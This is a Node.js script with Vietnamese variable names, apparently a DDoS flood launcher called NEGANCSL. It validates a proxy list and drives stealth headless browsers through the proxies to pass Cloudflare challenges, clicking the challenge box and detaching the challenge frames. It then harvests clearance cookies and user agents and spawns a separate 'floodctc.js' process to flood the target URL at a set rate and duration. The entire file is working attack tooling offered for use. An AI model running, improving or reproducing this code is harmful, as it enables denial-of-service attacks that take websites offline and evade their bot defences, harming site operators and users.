const xuLyLoi = loi => {}; process.on("uncaughtException", xuLyLoi); process.on("unhandledRejection", xuLyLoi);
Array.prototype.xoa = function (phanTu) { const index = this.indexOf(phanTu); if (index !== -1) this.splice(index, 1); return phanTu; };
const async = require("async"), fs = require("fs"), request = require("request"), puppeteer = require("puppeteer-extra"), puppeteerStealth = require("puppeteer-extra-plugin-stealth"), colors = require("colors");
process.setMaxListeners(0); require("events").EventEmitter.defaultMaxListeners = 0; puppeteer.use(puppeteerStealth());
const { spawn } = require("child_process");

if (process.argv.length < 8) { console.clear(); console.log(`node NEGANCSL url thread proxylist rate duration soluongproxycanxuat`.rainbow); process.exit(1); }

const targetURL = process.argv[2], threads = +process.argv[3], proxyFile = process.argv[4], fileContent = fs.readFileSync(proxyFile, "utf8"), proxiesCount = fileContent.split("\n").length, rates = process.argv[5], duration = process.argv[6], soLuongProxyCanXuat = +process.argv[7];
let soLuongProxyLive = 0, daDungXuatProxy = false, floodSuccessfully = 0;

const sleep = thoiGian => new Promise(resolve => setTimeout(resolve, thoiGian * 1000));
const docDong = duongDan => fs.readFileSync(duongDan).toString().split(/\r?\n/);
const chonNgauNhien = danhSach => danhSach[Math.floor(Math.random() * danhSach.length)];
const proxies = docDong(proxyFile); const userAgents = docDong("useragent.txt");

const kiemTraProxy = proxy => new Promise((resolve, reject) => {
  request({ url: "https://google.com", proxy: "http://" + proxy, headers: { "User-Agent": "curl/8.4.0" }, timeout: 2000 }, (err, res, body) => {
    if (!err && res.statusCode === 200) resolve(proxy); else reject();
  });
});

const kiemTraProxyHopLe = async proxy => {
  if (soLuongProxyLive >= soLuongProxyCanXuat) { daDungXuatProxy = true; return; }
  try { const checkedProxy = await kiemTraProxy(proxy); if (soLuongProxyLive >= soLuongProxyCanXuat) { daDungXuatProxy = true; return; } fs.appendFileSync("proxylive.txt", checkedProxy + "\n"); soLuongProxyLive++; return checkedProxy; } catch (error) { return null; }
};

const xuLyChallenge = async page => {
  await sleep(10); const captchaContainer = await page.$("body > div.main-wrapper > div > div > div > div");
  if (captchaContainer) { const box = await captchaContainer.boundingBox(); if (box) await page.mouse.click(box.x + 20, box.y + 20); } await sleep(10);
};

const phatHienChallenge = async (proxy, page) => {
  await page.waitForSelector("title"); const title = await page.title(); const content = await page.content();
  if (title === "Attention Required! | Cloudflare") throw new Error("Cloudflare challenge detected");
  if (content.includes("challenge-platform")) { console.log(("[+] NEGANCSL tìm thấy CLOUDFLARED !!! " + proxy).rainbow); await xuLyChallenge(page); return; }
};

const moTrinhDuyet = async (targetURL, proxy) => {
  const userAgent = chonNgauNhien(userAgents);
  const browser = await puppeteer.launch({ headless: true, ignoreHTTPSErrors: true, args: [`--proxy-server=http://${proxy}`, `--user-agent=${userAgent}`], ignoreDefaultArgs: ["--enable-automation"] });
  const [page] = await browser.pages(); const client = page._client();
  await page.setExtraHTTPHeaders({ referer: targetURL });
  await page.evaluateOnNewDocument(() => { navigator.permissions.query = parameters => Promise.resolve({ state: "granted" }); });
  await page.setJavaScriptEnabled(true); await page.setViewport({ width: 1920, height: 1080 });
  page.on("framenavigated", async frame => { if (frame.url().includes("challenges.cloudflare.com")) await client.send("Target.detachFromTarget", { targetId: frame._id }); });
  page.setDefaultNavigationTimeout(0); await page.goto(targetURL, { waitUntil: ["domcontentloaded"] });
  await phatHienChallenge(proxy, page); const content = await page.content();
  if (content.includes("challenge-platform")) await xuLyChallenge(page);
  const title = await page.title(); const cookies = await page.cookies(targetURL); const referer = await page.evaluate(() => document.referrer);
  await browser.close();
  return { title: title, browserProxy: proxy, cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(), userAgent: userAgent, content: content, referer: referer };
};

const checkCookie = cookie => {
  const cookieParts = cookie.split(";").map(part => part.trim());
  const hasMultipleCookies = cookieParts.length >= 1, isCookieLengthValid = cookie.length > 32, hasChallenge = cookieParts.some(part => part.includes("cf_chl"));
  return hasMultipleCookies && isCookieLengthValid && !hasChallenge;
};

const batDauLuong = async (targetURL, proxy, task, done) => {
  if (!proxy || daDungXuatProxy) return done();
  try {
    const { referer, cookies, title, browserProxy, userAgent } = await moTrinhDuyet(targetURL, proxy);
    const logData = `./FLOOD ${checkCookie(cookies) ? "Successfully" : "Failed: Cookie không hợp lệ"}\n./Từ mục tiêu: ${referer}\n./Kiểm tra tiêu đề: ${title}\n./Proxy trình duyệt: ${browserProxy}\n./User Agent: ${userAgent}\n./Cookie: ${cookies}`;
    console.log(checkCookie(cookies) ? logData.cyan : logData.yellow);
    if (checkCookie(cookies)) {
      floodSuccessfully++;
      console.log(`[+] Flood successfully: ${floodSuccessfully}/${threads}`.green);
      spawn("node", ["floodctc.js", targetURL, duration, "3", browserProxy, rates, cookies, userAgent]);
    }
  } catch (error) {
    console.log(`Không thể mở trình duyệt với proxy: ${proxy}`.red);
    const newProxy = chonNgauNhien(docDong("proxylive.txt"));
    if (newProxy) { console.log(`Đang thử lại với proxy mới: {${newProxy}}`.green); queue.unshift({ browserProxy: newProxy }); }
  } finally {
    done();
  }
};

var queue = async.queue((task, done) => batDauLuong(targetURL, task.browserProxy, task, done), threads);

const main = async () => {
  fs.writeFileSync("proxylive.txt", "");
  queue.drain(() => console.log("Tất cả tiến trình đã hoàn thành."));
  for (let i = 0; i < proxiesCount; i++) {
    if (daDungXuatProxy) break;
    const proxy = chonNgauNhien(proxies); proxies.splice(proxies.indexOf(proxy), 1);
    kiemTraProxyHopLe(proxy).then(proxy => { if (proxy && !daDungXuatProxy) queue.unshift({ browserProxy: proxy }); }).catch(() => {});
  }
  await sleep(duration); queue.kill(); process.exit();
};

main();